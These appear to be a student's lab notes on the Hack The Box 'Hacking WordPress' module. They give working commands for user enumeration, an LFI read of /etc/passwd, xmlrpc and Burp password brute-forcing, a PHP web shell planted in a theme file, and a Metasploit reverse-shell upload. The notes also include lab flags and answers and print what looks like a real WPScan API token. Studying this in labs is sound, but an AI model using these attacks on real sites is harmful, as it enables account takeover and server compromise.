![[HTB-Logo-RGB_1024-1024x198.png]]
# Table of Contents

- [[#Cheat sheet|Cheat sheet]]
- [[#Directory Indexing|Directory Indexing]]
- [[#Manually Enumerating Users|Manually Enumerating Users]]
- [[#Login|Login]]
- [[#WPScan|WPScan]]
- [[#Exploiting a Vulnerable Plugin|Exploiting a Vulnerable Plugin]]
- [[#Attacking WordPress Users - WPScan|Attacking WordPress Users - WPScan]]
- [[#Attacking WordPress Users - BurpSuite|Attacking WordPress Users - BurpSuite]]
- [[#Remote Code Execution via the Theme Editor|Remote Code Execution via the Theme Editor]]
- [[#Using Metasploit to attack WordPress|Using Metasploit to attack WordPress]]
	- [[#Using Metasploit to attack WordPress#Reference|Reference]]


## Cheat sheet
| **Command** | **Description** |
| --------------|-------------------|
|`tree -L 1` |  Lists contents of current directory |
|`curl   -s   -X GET   <--url-->` | Makes a GET request to a webserver and receives HTML source code of requested web page |
|`curl   -I   -X GET    <--url-->` | Prints the response header of the GET request from the requested web page |
|`curl -X POST -d  <--data-->  <url>` | Sends a POST request with data to specific webserver |
|`wpscan --url   <url-here>  -e ap` | Scans specific WordPress application to enumerate plugins |
|`wpscan   --url   <url>   -e u` | Scans specific WordPress application to enumerate users |
|`msfconsole` | Starts Metasploit Framework |
|`html2text` |  Converts redirected HTML output or files to easily readable output |
|`grep <pattern>` | Filters specific pattern in files or redirected output |
|`jq` | Transforms JSON input and streams of JSON entities |
|`man  <--tool-->` | Man provides you with the manpage of the specific tool |

-----------------------------
## Directory Indexing

```bash
Noxxsick@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text

****** Index of /wp-content/plugins/mail-masta ******
[[ICO]]       Name                 Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                         -  
[[DIR]]       amazon_api/          2020-05-13 18:01    -  
[[DIR]]       inc/                 2020-05-13 18:01    -  
[[DIR]]       lib/                 2020-05-13 18:01    -  
[[   ]]       plugin-interface.php 2020-05-13 18:01  88K  
[[TXT]]       readme.txt           2020-05-13 18:01 2.2K  
===========================================================================
     Apache/2.4.29 (Ubuntu) Server at blog.inlanefreight.com Port 80
```

We can also view the directory listing using cURL and convert the HTML output to a nice readable format using `html2text`.

we can find other directories by using the grep command like so:- 
```bash
curl -s -X GET http://blog.inlanefreight.local | grep 'wp-content/plugins/site-editor/*' 
```

![[Pasted image 20240126160234.png]]

Using the WPscan and cURL we were able to to find the flag to complete the section. 

![[Pasted image 20240124070910.png]]

--------------------------------------------
## Manually Enumerating Users 

*First Method*
```bash
Noxxsick@htb[/htb]$ curl -s -I -X GET http://blog.inlanefreight.com/?author=1

HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:47:08 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Redirect-By: WordPress
Location: http://blog.inlanefreight.com/index.php/author/admin/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

*Second Method*
```bash
Noxxsick@htb[/htb]$ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq

[
  {
    "id": 1,
    "name": "admin",
    "url": "",
    "description": "",
    "link": "http://blog.inlanefreight.com/index.php/author/admin/",
    <SNIP>
  },
  {
    "id": 2,
    "name": "ch4p",
    "url": "",
    "description": "",
    "link": "http://blog.inlanefreight.com/index.php/author/ch4p/",
    <SNIP>
  },
<SNIP>
```
> Can install **`jq`** with `sudo apt install jq`

-------------------
## Login 
Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the `xmlrpc.php` page.

If our POST request against `xmlrpc.php` contains valid credentials, we will receive the following output:

```bash
Noxxsick@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

*To Filter Results you can use the `grep` and `wc` command*

```bash
Noxxsick@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php | grep <name>  | wc -l 
```

----------
## WPScan
WPScan is a great tool that automates everything we have done manually, we can use it as it, but its recommended to get an api token from their website [Link](https://wpscan.com/)
we can install WPScan with the following command
```bash
gem install wpscan
```

Lets carry out a normal enumeration scan, we can do this by using the tag 
`--enumerate or -e`, 
we can also specify what we want enumerated for example
`-e ap` will enumerate plugins and `-e u` will enumerate users. 

**Scan Command**
```bash
wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
```

**api-token:-** `dXuagHGwwpGQXOs9PNuDVU3F1BRLOuI8bZlaa4H47T8`

**The Scan Results**
![[WPScanResults.txt]]

------
## Exploiting a Vulnerable Plugin 

From the WPScan results we have learned that their are a few vulnerable plugins. and an outdated theme. 

the *Mail Masta 1.0* plugin is vulnerable to SQL Injections as well as ==Local File Inclusion==. 

according to this https://www.exploit-db.com/exploits/40290 report. The exploit states that any unauthenticated user can read local files through the path
``/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd``

**In Browser Method**
We can either view this in the browser with this URL: ~
`view-source:http://94.237.58.211:59155/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
![[Pasted image 20240126012404.png]]

**Curl Method**
We can also use the curl method to get a list of all the users: ~ 
```bash
curl http://94.237.58.211:59155/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd 
```
![[Pasted image 20240126012656.png]]

Q:- *Use the same LFI vulnerability against your target and read the contents of the "/etc/passwd" file. Locate the only non-root user on the system with a login shell.*
Hint:-
```spoiler-block
The user has "/bin/bash" at the end of their entry in the "/etc/passwd" file.
```
A:- **sally.jones**

-------------------

## Attacking WordPress Users - WPScan 

**WPScan** isn't just for scanning for vulnerabilities, we can also use it too brute force a user with wordlist. when we ran the scan it returned results for 3 users 
- *david*
- *admin*
- *roger*

I am going to try and brute force the user roger with **rockyou.txt**, this could take sometime as the **rockyou.txt** file is got thousands of passwords in it. 

*The Command*
```bash
wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt --url http://83.136.251.235:55741/
```
- **--password-attack** : ==defines what we will be attacking in this case its *xmlrpc*==
- **-t 20** : 
- **-U** : ==defines the user==
- **-P** : ==defines what password list we will use==
- **--url** : ==Sets the target url we will be attacking==

![[Pasted image 20240126014308.png]]
As we can see from the attack, it was able to find a password that the user has in use 

To confirm this is the right password we can login to the website 
![[Pasted image 20240126014527.png]]

-----------------
## Attacking WordPress Users - BurpSuite

There is another method to brute force WordPress login forms, which can also be applied to other websites.  
  
First, open **BurpSuite**.  
  
Then, navigate to the WordPress login page. This can be accessed through *website/wp-login.php* or */wp-admin.php*.

In this case its:-
```
http://83.136.251.235:55741/wp-login.php
```
> Be sure to open up the login page in the BurpSuite Browser

Let's begin by completing the form. In this case, the form has been filled out as follows:
`Username - USERNAME`
`Password - PASSWORD`

![[Pasted image 20240126020813.png]]
This can assist in identifying the field when utilizing the intercept tool. Once the username and password have been entered, return to Burp Suite and enable the intercept feature.

![[Pasted image 20240126020842.png]]

When the intercept occurs, the user should click the login button on the website. This action will capture the login request.

![[Pasted image 20240126020928.png]]

On line 16, the username and password that were entered can be observed. Next, the request should be forwarded to the "*Intruder*" tab.  
  
This can be accomplished by selecting *"Action" > "Send to Intruder"* or by using the **Ctrl+I** shortcut.  
  
Once the request is in the "*Intruder*" tab, the username and password field should be selected and added to the payload marker.

![[vmware_RzOYsESw1a.gif]]

This can be accomplished by highlighting the text with the cursor and then navigating to the right-hand side of the screen to click on the "add" button. Next, it is necessary to choose the desired attack type, such as the cluster bomb attack.

![[Pasted image 20240126021625.png]]

Next go to the Payload tab 
![[Pasted image 20240126021716.png]]

Upon initiation, the system greets us with a payload value of 1, which serves as the designated username. It is crucial that this value is configured to the "Simple list" option. Additionally, we need to specify the desired username for the attack, in this instance, it is "*roger*".

![[Pasted image 20240126021853.png]]

Next, it is necessary to set the payload value to 2 in order to initiate the password attack.  
  
Regarding the payload type, the appropriate selection is the Runtime file option.  
Include the desired wordlist for the attack. In this case, *rockyou.txt* will be utilized. If operating on Kali Linux, this file can be found at **/usr/share/wordlists/**.

![[Pasted image 20240126022142.png]]

Now with that all set up lets start the attack. 

![[Pasted image 20240126022219.png]]

If the password does not match, the status code *200* is obtained. However, if it is the correct password, the status code *302* is obtained.

![[Pasted image 20240126022451.png]]

---------------

## Remote Code Execution via the Theme Editor

Log on to the target website with the admin username and password in this case it was `admin/sunshine1`

Go to Appearance > Theme Editor

you will see this page
![[Theme-Editor.png]]

lets change the theme to "Twenty Seventeen" 
![[Twenty-Seventeen.png]]

Now from theme files select the 404.php tempate

in the style.css editor you want to add this line of code 
```bash
system($_GET['cmd']);
```

it should look something like this
```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

This will allow us the attacker to execute commands via curl

example:-
```bash
Noxxsick@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"

uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
<SNIP>
```

we want to find the file called flag.txt we could use this command to find it. 
```bash
kali@kali:~$ curl -X GET "http://83.136.254.199:33944/wp-content/themes/twentyseventeen/404.php?cmd=ls+/home/wp-user"
flag.txt
<SNIP>
```

to see what is in the flag.txt we would use this command:-
```bash
kali@kali:~$ curl -X GET "http://83.136.254.199:33944/wp-content/themes/twentyseventeen/404.php?cmd=cat+/home/wp-user/flag.txt"
HTB{rc3_By_d3s1gn}
```

---------------------

## Using Metasploit to attack WordPress

To launch Metasploit we will need to run:-
```bash
msfconsole
```

For this exploit we will be using `wp_admin_shell_upload` we can search for that module with:-
```bash
msf5 > search wp_admin

Matching Modules
================

#  Name                                       Disclosure Date  Rank       Check  Description
-  ----                                       ---------------  ----       -----  -----------
0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
```

to Select the module 
```bash
msf5 > use 0

msf5 exploit(unix/webapp/wp_admin_shell_upload) >
```

next use the `show options` to see what we need to set up:- 
```bash
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.com
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.10.16.8z4444
[*] Authenticating with WordPress using admin:Winter202@...
[+] Authenticated with WordPress
[*] Uploading payload...
[*] Executing the payload at /wp—content/plugins/YtyZGFIhax/uTvAAKrAdp.php...
[*] Sending stage (38247 bytes) to blog.inlanefreight.com
[*] Meterpreter session 1 opened
[+] Deleted uTvAAKrAdp.php

meterpreter > getuid
Server username: www—data (33)
```


### Reference
-------------------------------

mrb3n & Cry0l1t3. **Hacking WordPress**. [online] Hack The Box Academy. Available at: [HackTheBox ~ Academy](https://academy.hackthebox.com/module/details/17) <*Accessed 26 January 2024, 9 AM*>. 

PortSwigger. **Brute-forcing passwords with Burp Suite**. [video] Available at: [YouTube](https://www.youtube.com/watch?v=bNLihWA_Ygw)  <*Accessed 26 January 2024, 9 AM*>.

----------------
